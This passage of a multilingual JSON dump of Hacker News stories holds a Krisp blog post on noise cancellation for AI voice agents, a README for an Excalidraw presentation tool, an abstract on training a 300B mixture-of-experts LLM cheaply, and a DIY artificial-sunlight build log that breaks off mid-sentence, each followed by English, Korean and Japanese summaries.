Krisp significantly improves downstream speech processing accuracy by delivering cleaner audio.\nIntroducing Krisp Server SDK for AI Voice Agents\nWe’re excited to announce the launch of Krisp Server SDK, featuring two advanced AI models engineered explicitly for superior noise cancellation for AI Voice Agents.\n\nCompared to our on-device AI models, these models are optimized to deliver unmatched performance and voice quality, especially in challenging corner cases.\n\nBoth models remove background noise, chatter, and secondary voices, ensuring the retention and clarity of only the primary speaker’s voice.\n\nBVC-tel (General-Purpose Model):\n\nDesigned as a robust, versatile solution ideal for a wide variety of audio sources, including WebRTC, mobile, and traditional telephony inputs.\nSpecifically engineered to be highly resilient against audio artifacts introduced by common telephony codecs, such as the G711 codec, widely used in telecommunication networks.\nSupports audio sampling rates up to 16 kHz, which is optimal for AI Voice Agents as it effectively captures the essential frequency ranges of human speech.\n\nBVC-app (High-Fidelity Model):\n\nSpecifically optimized for WebRTC use-cases where high-quality audio streams are required.\nSupports higher sampling rates up to 32 kHz, enabling clearer, more natural-sounding voice interactions suitable for applications with superior audio fidelity.\n\nℹ️ If the incoming audio source has a sampling rate higher than the model’s supported rate (e.g., 48 kHz), the SDK intelligently manages the audio processing by automatically downsampling to the model’s working rate, applying the noise cancellation and then seamlessly upsampling back to the original audio quality.\n\nDespite significant quality enhancements, server-side models maintain a low algorithmic latency of just 15 milliseconds, identical to our on-device models. This ensures real-time responsiveness, which is critical for conversational interactions.\n\nThe new Krisp Server SDK models are CPU-optimized and support a range of platforms, including:\n\nLinux (x64 and ARM64 architectures)\nWindows (x64) with ARM64 support coming soon.\n\nQuantifying the Krisp BVC Impact\nWe comprehensively evaluated how the new Background Voice and Noise Cancellation (BVC) model improves turn-taking accuracy and speech recognition quality.\nUsing the BVC-tel model, we specifically tested two distinct audio pipeline scenarios:\n\nBVC-VAD-STT: Audio processed by Krisp BVC and VAD is passed to the AI Voice Agent.\nBVC-VAD only: The original (unprocessed) audio is passed downstream to the AI Voice Agent, with Krisp BVC processed audio used solely for improved VAD accuracy.\n\nThe following graphics and audio examples demonstrate a typical example: Krisp BVC effectively canceling the background TV speech when interacting with the AI Voice Agent.\n\nThe red-circled areas represent the TV speech. The green-circled areas represent the primary speaker’s speech.\n\nTurn-taking with VAD only\n\nTurn-taking with BVC-VAD\n\nTV speech passes through VAD, potentially interrupting the AI Voice Agent during its response.\nTV speech passes through VAD, potentially interrupting the AI Voice Agent during its response.\n\nOriginal Audio\n\nhttps://krisp.ai/blog/wp-content/uploads/2025/03/Original-Recording-1.wav\nOriginal Audio\nhttps://krisp.ai/blog/wp-content/uploads/2025/03/Original-Recording.wav\n\nAudio after VAD processing only\nhttps://krisp.ai/blog/wp-content/uploads/2025/03/Original-Recording-No-BVC-VAD.wav\nAudio after BVC processing\nhttps://krisp.ai/blog/wp-content/uploads/2025/03/Original-Recording-After-BVC.wav\n\nAudio after BVC + VAD processing\nhttps://krisp.ai/blog/wp-content/uploads/2025/03/Original-Recording-After-BVC-VAD.wav\n\nIn the following sections, we perform more comprehensive evaluations to capture and quantify improvements in turn-taking and WER improvements in STT.\n\nEvaluation Setup:\n\nDataset: We selected the widely-used AMI corpus, specifically the individual headset recordings. This dataset is ideal due to its realistic mix of background conversations and noise, which is representative of many typical mobile and telephony scenarios.\nVoice Activity Detection: Latest version of open-source SileroVAD\nSpeech-To-Text Models: Whisper V3 (base version). In our tests, the difference between the base and large versions was insignificant, so we present only the base model results.\n\nImpact on Turn-Taking\nApplying Krisp BVC upstream had a clear, positive impact on VAD precision within the AMI dataset—especially in reducing false-positive speech detections. Lower false positives are particularly critical for ensuring smooth, uninterrupted conversational experiences.\n\nOur tests show that with Krisp BVC, false-positive triggers in VAD were reduced by 3.5x on average. This means the AI Voice Agent is significantly less likely to experience unintended interruptions caused by background speech or noise. Overall, the precision after Krisp BVC increases by over a quarter—a major improvement.\nImpact on Speech Recognition Accuracy (WER)\nUsing Krisp BVC also markedly reduces the Word Error Rate (WER) of Whisper V3 models on the AMI dataset—achieving more than a 2x improvement. This result aligns with expectations, given Krisp’s effectiveness in eliminating distracting background speech.\n\nInterestingly, the WER improvements were consistent in both BVC-VAD and BVC-VAD-STT modes.\n\nTo further explore this, we evaluated an additional dataset with minimal background speech: the ITU-T P.501 dataset, which mixes single-speaker audio with 24 different noise types at three intensity levels (0db, 5db, 10db).\n\nModern STT models, including Whisper, generally have strong built-in noise robustness. We aimed to measure any further WER improvements achievable by applying Krisp BVC upstream.\n\nIndeed, the WER metric was generally much lower in this case compared to the AMI dataset.\n\nIn the BVC-VAD mode, where Whisper operated on original audio while leveraging Krisp BVC-processed audio for enhanced VAD, we observed an 18% improvement in WER.\n\nConversely, in the BVC-VAD-STT mode — where Whisper processed Krisp-modified audio—the WER increased by about 2x, although the absolute WER number is still relatively low. This increase is attributed to Whisper never encountering Krisp NC-processed audio during its training, which could cause suboptimal performance for such modified audio.\n\n💡Note that WER% results in BVC-VAD-STT mode could be very different on other datasets and STT engines. We recommend experimenting with both BVC-VAD and BVC-VAD-STT modes to determine the optimal audio pipeline setup for you.\n\nOverall, these evaluations demonstrate that incorporating Krisp BVC into AI Voice Agents pipelines substantially improves turn-taking and speech recognition quality, especially in real-world scenarios where background noise and secondary conversations are prevalent.\n\n                        Please enable JavaScript to view the <a href=\"https://disqus.com/?ref_noscript\">comments powered by Disqus.</a>\n\n            Related Articles\n\n            Krisp and Fixie Bring AI Noise Cancellation to Ultravox to Improve Bot-to-Human Communication\n\n                Krisp and Fixie Bring AI Noise Cancellation to...\n\n        December 23, 2024\n\n                Company\n\n                Krisp News\n\n                SDK\n\n            Krisp and Vodex Partner to Perfect GenAI-Powered Voicebot Calls for High-Quality Lead Qualification\n\n                Krisp and Vodex Partner to Perfect GenAI-Powered Voicebot...\n\n        March 12, 2025\n\n                Company\n\n                Krisp News\n\n                SDK\n\n            Krisp launches Accent Conversion SDK Early Access Program for Communications Providers\n\n                Krisp launches Accent Conversion SDK Early Access Program...\n\n        March 12, 2025\n\n                AI Accent Conversion\n\n                Company\n\n                SDK\n\n            Elevate Your Contact Center Experience with Krisp Background Voice Cancellation (BVC)\n\n                Elevate Your Contact Center Experience with Krisp Background...\n\n        March 12, 2025\n\n                Engineering Blog\n\n                SDK\n\n            Krisp launches On-Device Transcription SDKs for Integration\n\n                Krisp launches On-Device Transcription SDKs for Integration\n\n        March 11, 2025\n\n                Krisp News\n\n                SDK\n\n            Enhancing Browser App Experiences: Krisp JS SDK Pioneers In-browser AI Voice Processing for Desktop and Mobile\n\n                Enhancing Browser App Experiences: Krisp JS SDK Pioneers...\n\n        March 12, 2025\n\n                Engineering Blog\n\n                SDK\n\n            Krisp Delivers AI-Powered Voice Clarity to Symphony’s Trader Voice Products\n\n                Krisp Delivers AI-Powered Voice Clarity to Symphony’s Trader...\n\n        March 12, 2025\n\n                Engineering Blog\n\n                Krisp News\n\n            Vonage to Launch Enhanced Noise Cancellation Powered by Krisp's Voice AI\n\n                Vonage to Launch Enhanced Noise Cancellation Powered by...\n\n        March 12, 2025\n\n                Krisp News\n\n                SDK\n\n            Krisp and CarrierX’s FreeConferenceCall.com Integrate to Deliver AI-Powered Voice Clarity and Noise Cancellation\n\n                Krisp and CarrierX’s FreeConferenceCall.com Integrate to Deliver AI-Powered...\n\n        March 12, 2025\n\n                Krisp News\n\n                SDK",
    "summary": {
      "en": "**Summary: Improving Turn-Taking for AI Voice Agents with Krisp SDK**\n\nAI Voice Agents are increasingly used for tasks like customer support, but managing smooth conversations is challenging due to background noise. To address this, Krisp has launched the Server SDK, which includes advanced models for noise cancellation, improving how these agents respond in real-time.\n\n**Key Features of Krisp Server SDK:**\n1. **Noise Cancellation Models**: There are two models:\n   - **BVC-tel**: General-purpose, suitable for various audio sources, resilient against telephony noise.\n   - **BVC-app**: High-fidelity, optimized for clear audio in WebRTC applications.\n\n2. **Real-Time Performance**: The SDK ensures minimal delay (15 milliseconds), maintaining the natural flow of conversation.\n\n3. **Impact on Turn-Taking**:\n   - Reduces false-positive speech detections by 3.5 times, leading to fewer interruptions during conversations.\n   - Enhances overall conversation quality.\n\n4. **Impact on Speech Recognition Accuracy**:\n   - More than 2x improvement in Word Error Rate (WER) for speech recognition, making understanding clearer.\n\nIn conclusion, integrating Krisp's Background Voice and Noise Cancellation technology significantly enhances the performance of AI Voice Agents, especially in noisy environments.",
      "ko": "AI 음성 에이전트는 고객 지원과 같은 다양한 작업에 점점 더 많이 사용되고 있지만, 배경 소음으로 인해 원활한 대화를 관리하는 것이 어렵습니다. 이를 해결하기 위해 Krisp는 서버 SDK를 출시했습니다. 이 SDK는 소음 제거를 위한 고급 모델을 포함하고 있어, AI 음성 에이전트가 실시간으로 더 잘 반응할 수 있도록 개선했습니다.\n\nKrisp 서버 SDK의 주요 기능은 다음과 같습니다. 첫째, 소음 제거 모델이 두 가지 있습니다. BVC-tel은 일반적인 용도로 다양한 오디오 소스에 적합하며, 전화 소음에 강한 특징이 있습니다. BVC-app은 고음질을 제공하며, WebRTC 애플리케이션에서 명확한 오디오를 위해 최적화되어 있습니다. 둘째, 이 SDK는 최소한의 지연 시간(15밀리초)을 보장하여 대화의 자연스러운 흐름을 유지합니다.\n\n셋째, 턴 테이킹(turn-taking)에도 긍정적인 영향을 미칩니다. 잘못된 음성 감지를 3.5배 줄여 대화 중의 방해를 줄이고, 전체적인 대화 품질을 향상시킵니다. 넷째, 음성 인식 정확도에도 영향을 미쳐, 음성 인식의 단어 오류율(Word Error Rate, WER)이 2배 이상 개선되어 이해도가 높아집니다.\n\nKrisp의 배경 음성 및 소음 제거 기술을 통합하면, 특히 소음이 많은 환경에서 AI 음성 에이전트의 성능이 크게 향상됩니다.",
      "ja": "AIボイスエージェントは、カスタマーサポートなどの業務でますます利用されていますが、背景雑音のためにスムーズな会話を管理するのが難しいという課題があります。この問題を解決するために、KrispはサーバーSDKを発表しました。このSDKには、ノイズキャンセリングのための高度なモデルが含まれており、エージェントがリアルタイムで応答する際の改善が期待されています。\n\nKrispサーバーSDKの主な特徴には、まずノイズキャンセリングモデルが2つあります。1つ目は「BVC-tel」で、一般的な用途に適しており、さまざまな音源に対応し、電話の雑音にも強いです。2つ目は「BVC-app」で、高音質を提供し、WebRTCアプリケーションでのクリアな音声に最適化されています。\n\n次に、リアルタイム性能についてですが、このSDKは遅延を最小限に抑え（15ミリ秒）、会話の自然な流れを維持します。\n\nターンテイキングへの影響としては、誤検出によるスピーチの誤認識を3.5倍減少させ、会話中の中断を減らします。これにより、全体的な会話の質が向上します。\n\nさらに、スピーチ認識の精度にも影響を与え、単語誤り率（WER）が2倍以上改善され、理解がより明確になります。\n\nKrispの背景音声とノイズキャンセリング技術を統合することで、特に騒がしい環境においてAIボイスエージェントの性能が大幅に向上することが期待されています。"
    }
  },
  {
    "id": "826927cf951a630b",
    "title": {
      "en": "Show HN: Create presentations with smart animations using Excalidraw",
      "ko": "스마트 애니메이션으로 프레젠테이션 만들기!",
      "ja": "エクスカリドローで魅せるプレゼン"
    },
    "type": "story",
    "url": "https://github.com/excalidraw-smart-presentation/excalidraw-smart-presentation.github.io",
    "score": 7,
    "by": "OmarBrikaa",
    "time": 1743251115,
    "content": "Excalidraw Smart Presentation\nCreate dynamic, animated presentations directly within Excalidraw.\nThis tool allows you to define frames as slides, automatically animating elements that persist between frames. It enables seamless transitions and a structured way to present ideas visually.\n\n    excalidraw-smart-presentation.mp4\n\nPresentation source: Available in ./presentation-docs.\nHow to Use\n\nCreate Frames:\n\nUse the Frame tool (f key, toolbar, or command palette).\nEach frame represents a slide.\n\nDefine Slide Order:\n\nFrames are ordered based on their y-axis position.\n\nAnimations:\n\nElements that are duplicated from one frame to the other are animated on slide transition by interpolating the changes in their properties.\nThis behavior can be customized (see below).\n\nPresent Your Slides:\n\nClick \"Present\", then use → / ← (arrow keys) to navigate.\n\nTips & Tricks\n\nStart from a Specific Slide:\n\nSelect a frame, then click \"Present\".\n\nMaintain a 16:9 Aspect Ratio or any exact size:\n\nEdit frame size via \"Canvas & Shape Properties\" (Alt + / or command palette).\n\nDuplicate an element into the exact same position in the next frame:\n\nSelect an element, then press Ctrl + Shift + D\nOr use \"Duplicate into next frame\" from the command palette.\n\nFix Unintended Animations:\n\nElements with the same name in consecutive frames are animated.\nElements are given the same name on duplication, hence why duplicated elements are animated.\nRename elements in \"Canvas & Shape Properties\" to prevent unwanted animations or to animate different elements.\n\nCurrent Limitations\n\nNot usable on touch-screens and requires a keyboard since arrow keys are the only way to navigate slides.\nThe \"Present\" button is not shown on mobile/small screens, users must open a new tab and append #presentation=0 manually to the website's link.\nAnimation duration (300 ms) and type (linear) are not customizable.\nAnimations can sometimes be slightly choppy, though this is not a major issue.",
    "summary": {
      "en": "**Excalidraw Smart Presentation Summary**\n\nExcalidraw offers a tool for creating animated presentations. Here are the key points:\n\n- **Dynamic Slides**: You can create slides (frames) that automatically animate elements between them for smooth transitions.\n  \n- **Creating Frames**: Use the Frame tool (press 'f' or access the toolbar) to create slides, which are arranged by their vertical position.\n\n- **Animation**: Duplicated elements between frames automatically animate during transitions. You can customize this behavior.\n\n- **Presenting**: Click \"Present\" and navigate through slides using the arrow keys.\n\n**Tips**:\n- Start from any slide by selecting a frame and clicking \"Present.\"\n- To maintain a specific size, adjust frame dimensions in \"Canvas & Shape Properties.\"\n- Use Ctrl + Shift + D to duplicate elements in the same position on the next slide.\n- Rename elements to control animations and avoid unwanted effects.\n\n**Limitations**:\n- Not touch-screen compatible and requires keyboard navigation.\n- The \"Present\" button is hidden on small screens; manually adjust the URL for access.\n- Animation settings (duration and type) are fixed and not customizable.\n- Some animations may appear choppy, but it's generally not a significant issue.",
      "ko": "엑스칼리드로우는 애니메이션 프레젠테이션을 만들 수 있는 도구를 제공합니다. 주요 내용은 다음과 같습니다.\n\n동적인 슬라이드를 만들 수 있으며, 슬라이드 간의 요소들이 자동으로 애니메이션되어 부드러운 전환을 제공합니다. 슬라이드를 만들기 위해서는 프레임 도구를 사용해야 하며, 'f' 키를 누르거나 툴바에서 접근할 수 있습니다. 슬라이드는 수직 위치에 따라 정렬됩니다.\n\n프레임 간에 중복된 요소는 전환 중에 자동으로 애니메이션이 적용됩니다. 이 동작은 사용자에 맞게 조정할 수 있습니다. 프레젠테이션을 시작하려면 \"Present\" 버튼을 클릭하고 화살표 키를 사용해 슬라이드를 탐색하면 됩니다.\n\n몇 가지 팁으로는, 원하는 슬라이드에서 시작하려면 프레임을 선택하고 \"Present\"를 클릭하면 됩니다. 특정 크기를 유지하려면 \"Canvas & Shape Properties\"에서 프레임의 크기를 조정해야 합니다. Ctrl + Shift + D를 사용하면 다음 슬라이드에서 동일한 위치에 요소를 복제할 수 있습니다. 요소의 이름을 바꾸면 애니메이션을 제어하고 원치 않는 효과를 피할 수 있습니다.\n\n제한 사항으로는 터치 스크린과 호환되지 않으며 키보드 내비게이션이 필요합니다. 작은 화면에서는 \"Present\" 버튼이 숨겨져 있으므로 URL을 수동으로 조정해야 접근할 수 있습니다. 애니메이션 설정(지속 시간과 유형)은 고정되어 있어 사용자 맞춤 설정이 불가능합니다. 일부 애니메이션은 다소 끊기는 경우가 있지만, 일반적으로 큰 문제는 아닙니다.",
      "ja": "Excalidrawは、アニメーションプレゼンテーションを作成するためのツールを提供しています。主なポイントは以下の通りです。\n\n動的なスライドを作成でき、スライド間の要素が自動的にアニメーションし、スムーズな移行が可能です。スライドを作成するには、フレームツールを使用します。フレームツールは「f」を押すか、ツールバーからアクセスできます。スライドは縦の位置によって配置されます。\n\nフレーム間で複製された要素は、移行中に自動的にアニメーションします。この動作はカスタマイズ可能です。プレゼンテーションを行うには、「Present」をクリックし、矢印キーを使ってスライドを移動します。\n\nいくつかのヒントとして、任意のスライドから始めるには、フレームを選択して「Present」をクリックします。特定のサイズを維持するには、「Canvas & Shape Properties」でフレームの寸法を調整します。同じ位置に要素を複製するには、Ctrl + Shift + Dを使用します。また、アニメーションを制御し、不要な効果を避けるために要素の名前を変更することも重要です。\n\n制限事項としては、タッチスクリーンには対応しておらず、キーボードでの操作が必要です。小さな画面では「Present」ボタンが隠れているため、手動でURLを調整してアクセスする必要があります。アニメーションの設定（持続時間や種類）は固定されており、カスタマイズはできません。また、一部のアニメーションはカクカクして見えることがありますが、一般的には大きな問題ではありません。"
    }
  },
  {
    "id": "25013395192a7d77",
    "title": {
      "en": "Every Flop Counts: Scaling a 300B LLM Without Premium GPUs",
      "ko": "모든 실패가 중요하다: 300B LLM의 저비용 확장",
      "ja": "フロップの力: 300B LLMの挑戦"
    },
    "type": "story",
    "url": "https://arxiv.org/abs/2503.05139",
    "score": 114,
    "by": "bretpiatt",
    "time": 1742820496,
    "content": "In this technical report, we tackle the challenges of training large-scale Mixture of Experts (MoE) models, focusing on overcoming cost inefficiency and resource limitations prevalent in such systems. To address these issues, we present two differently sized MoE large language models (LLMs), namely Ling-Lite and Ling-Plus (referred to as \"Bailing\" in Chinese, spelled Bǎilíng in Pinyin). Ling-Lite contains 16.8 billion parameters with 2.75 billion activated parameters, while Ling-Plus boasts 290 billion parameters with 28.8 billion activated parameters. Both models exhibit comparable performance to leading industry benchmarks. This report offers actionable insights to improve the efficiency and accessibility of AI development in resource-constrained settings, promoting more scalable and sustainable technologies. Specifically, to reduce training costs for large-scale MoE models, we propose innovative methods for (1) optimization of model architecture and training processes, (2) refinement of training anomaly handling, and (3) enhancement of model evaluation efficiency. Additionally, leveraging high-quality data generated from knowledge graphs, our models demonstrate superior capabilities in tool use compared to other models. Ultimately, our experimental findings demonstrate that a 300B MoE LLM can be effectively trained on lower-performance devices while achieving comparable performance to models of a similar scale, including dense and MoE models. Compared to high-performance devices, utilizing a lower-specification hardware system during the pre-training phase demonstrates significant cost savings, reducing computing costs by approximately 20%. The models can be accessed at this https URL.",
    "summary": {
      "en": "This report addresses the challenges of training large Mixture of Experts (MoE) models, particularly focusing on cost and resource limitations. It introduces two models: Ling-Lite, with 16.8 billion parameters, and Ling-Plus, with 290 billion parameters. Both models perform similarly to top industry standards. The report provides practical strategies to enhance AI development in resource-limited environments, making it more scalable and sustainable. Key methods to reduce training costs include optimizing model architecture, improving training anomaly handling, and increasing evaluation efficiency. The models also utilize high-quality data from knowledge graphs, enhancing their tool use capabilities. Notably, a 300B MoE model can be trained on less powerful devices while maintaining competitive performance, which can save about 20% in computing costs compared to using high-performance hardware.",
      "ko": "이 보고서는 대규모 전문가 혼합 모델(MoE)을 훈련하는 데 있어 비용과 자원 제한이라는 도전 과제를 다룹니다. 특히 168억 개의 매개변수를 가진 Ling-Lite 모델과 2900억 개의 매개변수를 가진 Ling-Plus 모델을 소개합니다. 두 모델 모두 업계 최고 수준의 성능을 보입니다. 이 보고서는 자원이 제한된 환경에서 AI 개발을 향상시키기 위한 실용적인 전략을 제시하여, 더 확장 가능하고 지속 가능한 개발을 가능하게 합니다. 훈련 비용을 줄이기 위한 주요 방법으로는 모델 구조 최적화, 훈련 중 이상 처리 개선, 평가 효율성 증가 등이 있습니다. 또한 이 모델들은 지식 그래프에서 얻은 고품질 데이터를 활용하여 도구 사용 능력을 향상시킵니다. 특히, 300B MoE 모델은 성능을 유지하면서도 덜 강력한 장치에서 훈련할 수 있어, 고성능 하드웨어를 사용할 때보다 약 20%의 컴퓨팅 비용을 절감할 수 있습니다.",
      "ja": "この報告書では、大規模なMixture of Experts（MoE）モデルのトレーニングに関する課題、特にコストやリソースの制約について取り上げています。16.8億パラメータを持つLing-Liteモデルと、290億パラメータを持つLing-Plusモデルの2つを紹介しています。どちらのモデルも、業界のトップスタンダードと同等の性能を発揮します。この報告書では、リソースが限られた環境でのAI開発を促進するための実用的な戦略を提供し、スケーラビリティと持続可能性を高めることを目指しています。\n\nトレーニングコストを削減するための主な方法には、モデルアーキテクチャの最適化、トレーニング中の異常処理の改善、評価効率の向上が含まれます。また、モデルは知識グラフからの高品質なデータを活用し、ツールの使用能力を向上させています。特に、300億パラメータのMoEモデルは、性能を維持しながら、より性能の低いデバイスでトレーニングが可能であり、高性能ハードウェアを使用する場合と比べて約20%の計算コストを節約できることが示されています。"
    }
  },
  {
    "id": "212a03a3801f11de",
    "title": {
      "en": "I tried making artificial sunlight at home",
      "ko": "인공 햇빛 만들기 도전!",
      "ja": "自宅で人工太陽作り！"
    },
    "type": "story",
    "url": "https://victorpoughon.fr/i-tried-making-artificial-sunlight-at-home/",
    "score": 596,
    "by": "fouronnes3",
    "time": 1743104968,
    "content": "I tried making artificial sunlight at home\n\n                    27 Mar, 2025\n\n    Some time ago, I saw this video by DIY Perks where they make artificial sunlight at home with a 500W LED and a gigantic (1.2m) parabolic reflector. I've been fascinated by this project ever since, and I wanted my own.\nOver the past year or so, I finally took the time to work on a similar project, but I had the idea for a different design. The issue with the parabolic reflector is that it takes a huge amount of space. Could I do something similar, but with a less bulky design? This is the story of my first attempt at this project - version 1 so to speak. Perhaps there will be a version 2 in the future. Enjoy the read!\n\nMy idea - as others have had I'm sure - was to use an array of lenses laid out as a grid. Then, instead of a single light source, I would use a grid array of multiple LEDs, one per lens. In my mind, this would have two major advantages:\n\nLess bulky. The size of the device would be determined by the focal length of the individual lens elements, and because each would be small, the focal length could be small also, while maintaining a decent f number.\nEasier thermal management. Multiple light sources could be regular low power LEDs which wouldn't need special cooling. There would just be a lot of them, spread out over the entire device surface.\n\nOver the course of this project, I also intended to teach myself some manufacturing and 3D design, as I don't have any experience doing any of this. My background is software, and as you'll see I took a very software heavy approach to this. It was all a long learning journey for me, but in the end I used:\n\nMostly build123d for CAD modeling, with some FreeCAD for final assembly checks and some experiments here and there - including with the cool OpticsWorkbench.\nKiCad for PCB design.\nCustom python code for simulating light and optimizing the optical system. (This custom code eventually became an entire open-source project for optimization-based optical design)\nJLCPCB for printing and assembling PCBs, and for manufacturing aluminum and plastic parts with their CNC service.\n\nTL;DR: I did it! Here is the finished device sitting on my desk today, at night:\n\nAnd here it is during the day (much less impressive!)\n\nBeware it's kinda hard to take good pictures of it, and I don't have the best photo gear. Here's also a video: (at night)\n\n  Your browser does not support the video tag.\n\nKinda cool that you can see a lens flare effect in the shape of the lens grid array.\nTechnical specsMechanical:\n\nLens square side length: 30mm\nEffective Focal length: 55mm\nArray size: 6x6 = 36 LEDs\nTotal size: 180x180mm\n\nParts:\n\nLenses: 1 biconvex lens array, 1 plano-convex lens array - custom made out of PMMA acrylic, CNC fabrication with vapor polish finish @ JLCCNC\nLEDs: LUXEON 2835 3V -- Ref: 2835HE. CRI: 95+, color temp: 4000K, 65mA.\nPCBs: Custom design\nMounting hardware: custom design - aluminium 60601 for the CNC parts and mate black resin for the 3D printed parts\nRayleigh diffuser: waterproof printing inkjet film\n\nGeneral design and sizingTo create artificial sunlight, you need four ingredients:\n\nParallel light rays. The sun is so far away that light rays emitted from a point on the surface of the sun reach us essentially parallel. This is not to say that all light rays coming from the sun are parallel, as it still has a 0.5 deg apparent angular size. But they need to be pretty straight. Any light coming from an artificial light source like an LED will be going in all directions, so some optics is required.\nHigh color quality. A good indicator to look for on a datasheet is the color rendering index (CRI). 95+ is recommended to achieve a good effect. I'm sure there's more color science you could get into, but CRI is a great start for off the shelf parts.\nRayleigh scattering, or an imitation of it.\nA LOT of power.\n\nLight intensity is the most important sizing constraint, so let's look at it first. Now, the sun is very bright. Like, ridiculously bright: around 100,000 lux. To achieve this with LEDs is by no means impossible, but it's a challenge. For this first version, I thought that targetting 10,000 lux would be quite enough because it would reduce the power consumption a lot for a first prototype, and also brightness perception is logarithmic. So one tenth of the intensity is really, perceptually, almost the same as full brightness. (In the end, I estimate my design only effectively achieved something between 1000 and 10000 lux).\nThe general grid based design of this project really has two variables:\n\nthe individual LED light output, in lumens\nthe individual lens surface area in mm²\n\nAfter some research, I think values between 30 to 130 lumens are typical for high CRI surface mount LEDs. So, assuming this is what we are working with, what is the required lens size to achieve the brightness of the sun?\nWe have to assume some non perfect efficiency for collimating the light. This will never be 100%, and in fact may be quite low if the focal length is high, because a lot of the light will be hitting the side walls instead of reaching the lens. The lens itself will also be absorbing some light. So taking a wild guess of 0.5 for the overall optical efficiency, and taking three lumens value of 30, 80 and 130, we get this plot:\n\nWith that in mind, I selected 30mm as my lens square side length. Presumably, this would be small enough to achieve some effect, but not too small to make the lenses too hard to make.\nLensesFocal length, and the lenses shape in general, is the next design consideration. The goal is to have perfectly parallel light rays. In theory, with a perfect point source and a perfect lens this is easy. Put the light source at the lens focal length, you're done. In practice, a lot of things make it harder to achieve with a lens. (This is where the parabolic reflector design is superior to a lens).\n\nA LED is not a point source\nA lens will not have perfect optical performance (i.e. aberrations)\nMechanical reality of the device means that positioning and orientation will not be perfect\nA LED radiation pattern is not isotropic, meaning intensity will be greater at the lens center\n\nThis is the radiation pattern characteristics diagram from my LED datasheet:\n\nI wrote some custom python code to simulate the optical system I had in mind, and find the best lens shape using numerical optimization. (This code eventually became an open-source project: torchlensmaker) After a lot of experimentation, I settled on a 2 lens design:\n\nLens 1: Biconvex parabolic lens\nLens 2: Planoconvex parabolic lens\n\nThe effective focal length of this two lens system is about 55mm. Focal length is a key design parameter, and here I feel like more experimentation is needed. It's a big tradeoff consideration and has a huge impact on the system design. It impacts:\n\nThe curvature of the lens surface, which is a key manufacturing point (you want to minimize curvature for manufacturing, which means maximizing focal length)\nThe optical efficiency of the system due to the led radiance pattern (here you want to minimize focal length, to gather more of the emitted light)\nThe device thickness (here I wanted a not-too-thick device, so to minimize focal length also)\n\nI used a two lens system mostly to reduce the surface curvature of the lens arrays. This reduces the manufacturing cost by a lot. High curvature lenses are more expensive in general, and this grid array design means that a high curvature lens will create sort of \"valleys\" in between the lenses. Because I was targetting CNC manufacturing, this is to be minimized to get a design that's even possible to machine.\nThis is the optical simulation I had at the time I finalized the design and ordered the lenses. (Since then my simulation code has improved and I could likely do much better modeling today using the latest version of torchlensmaker):\n\nWith some custom build123d code I was able to make the two lenses 3D models by stacking the lenses in a grid pattern and adding edges for mounting:\n\n  <p>Your browser does not support iframes.</p>\n\n  <p>Your browser does not support iframes.</p>\n\nWhat's really cool using build123d for 3D modeling, is that I can just change a python variable to change the size of the array, of the thickness of the lens, of anything else really. It's all parametric out of the box because it's regular Python code! This makes exploring the design space very efficient. I've never done 3D modeling any other way, but I can't imagine ever not having the power of programming with me if I ever do it again!\nI had the lenses manufactured out of PMMA acrylic at JLC with a vapor polish finish. Total cost for the lenses was about 55€ which is really not bad!\nOne of the two main lens array, built by JLCCNC:\n\nLEDsI really wanted to use the 3030 G04 from YUJILEDS, but it's only sold on 5000 units reels that cost $1000 a piece... maybe for version 2 I will upgrade to those. For version 1, I settled on LUXEON 2835 3V. They are about 3 times less bright than the YUJILED, but they have good color rendering and the SMD package I was looking for. And importantly, the minimum order quantity was only 50 at JLC global sourcing.\nIn the version 1 design, the grid is 6x6 which means 36 LEDs total.\nPCBsI designed a custom PCB with KiCAD. Each PCB holds 6 LEDs which are laid out as 2 segments of a 12V led strip in parallel. This allows to use a standard wall plug 12V power supply.\n\nThe mechanical role of the PCB is very important in this design. Not only does it distribute power to the LEDs and regulate current, it also precisely positions the LEDs at the lens focal point. For this, exporting the PCB 3D model and importing it into FreeCAD was very useful to check that everything fits together: the PCB in the aluminum support baseplate, the holes on the light hoods, etc. My Python code exported the precise LED coordinates which I could input into KiCad's layout editor.\nI had the PCB printed and the components assembled by JLCPCB. It's very very cool to design an electronic board on your computer and get it fully assembled in the mail a few weeks later - no soldering required! (for this step anyway).\n\nMechanical mounting partsTo mount everything together I designed 3 parts:\n\nA baseplate, to hold the PCBs and the side walls. The PCBs are fitted below the baseplate, and light goes through holes drilled into the baseplate. There are also partial holes to allow for the thickness of the SMD resistors mounted on top of the PCBs, and finally two mounting holes per PCB. This is why it has so many holes :)\n\n  <p>Your browser does not support iframes.</p>\n\nSide walls to hold the lenses using grooves in which to insert them, and a larger groove to secure in the baseplate. The baseplate side holes are threaded to support M2 screws securing the base of the walls. Again, JLCCNC did the drilling and threading of the holes at a great price.\n\n  <p>Your browser does not support iframes.</p>\n\nLight hoods, a rectangle block with rectangular holes. It sits on top of the PCB to shape the light coming from each LED into a cone (or really a four sided pyramid). This is to make sure light from a given LED only reaches its matching lens on the lens array, and no other. Bleed light is inevitable, but at least this prevents direct leakage.\n\n  <p>Your browser does not support iframes.</p>\n\nThe hoods were 3D printed out of black resin, the walls and baseplate were CNC cut out of Aluminum 60601.\nI'm not a mechanical engineer so this process was... trial and error. Still the result is working so I'm quite happy with that. For a possible version 2, there's a lot I'll change in the mechanical design. But apart from the one design flaw I was able to fix manually with a drill (more on that below), everything fit together quite well on the first try.\nRayleigh scatteringThe final ingredient is Rayleigh scattering. This is the physical phenomenon that makes the sky look blue, and it's important to achieve a convincing effect. In the DIY Perks video that inspired this project, they used a home made liquid solution with suspended particles of the correct size for Rayleigh scattering. Not super practical and I really wanted to find another solution (get it?). Thankfully, some time after the original video, someone on the diyperks forum discovered that inkjet print film achieves a very similar effect. A quick trip to a local office supply store was all I needed here! Amazing discovery.\nI didn't anticipate this step during the initial design phase, so the film is simply cut to the correct size and secured with black electrical tape.\nAssemblyAfter a few weeks of design work, and another few weeks of waiting for the parts to arrive, it was finally time for assembly!\nOn top of the individual 3D models made with build123d, I had a final assembly FreeCAD model with all parts fitted together, including the lenses:\n\nNote the green brackets that I initially planned to use. When actually assembling the walls to the baseplate, the solidity of the formed box was very high, I decided to drop the brackets entirely. This is why some extra unused holes remain on the side walls.\nThis is all the parts just after unboxing (excluding the inkjet film, solder tin, screws, power supply, wiring, electrical tape):\n\nThe only real design flaw was insufficient width of the grooves that hold the lenses. The lenses have an edge thickness of 1.2mm, which I had intended to fit into a 1.22mm groove. Turns out this was not enough, probably due to a combination of manufacturing tolerance and additional thickness added by the anodizing black matte surface finish of the aluminum part. The lenses didn't fit into the grooves!\nI don't 